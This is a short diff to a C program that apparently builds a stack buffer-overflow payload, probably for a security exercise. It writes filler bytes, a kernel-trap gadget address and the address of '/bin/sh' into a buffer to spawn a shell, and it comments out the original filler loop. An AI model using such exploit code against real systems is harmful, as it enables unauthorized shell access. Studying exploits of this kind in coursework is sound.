@@ -26,8 +26,8 @@ int main(void)
 
   int i;
   // Fill up buffer
-  for(i = 0; i < 131; i++)
-    memcpy(bufr + i, "\x01",1);
+  // for(i = 0; i < 131; i++)
+  //   memcpy(bufr + i, "\x01",1);
 
   // overwrite ebp
   // pop arg into edx
@@ -49,6 +49,7 @@ int main(void)
   // trap into kernel
   strcpy(bufr + 163, trap); // 0xbba9b6e5
   // leave 4 bytes for the ret call of trap
+  strcpy(bufr + 168, "\x01\x01\x01\x01");
   // address of "/bin/sh"
   strcpy(bufr + 171, shell_addr);
   // address of prev arg
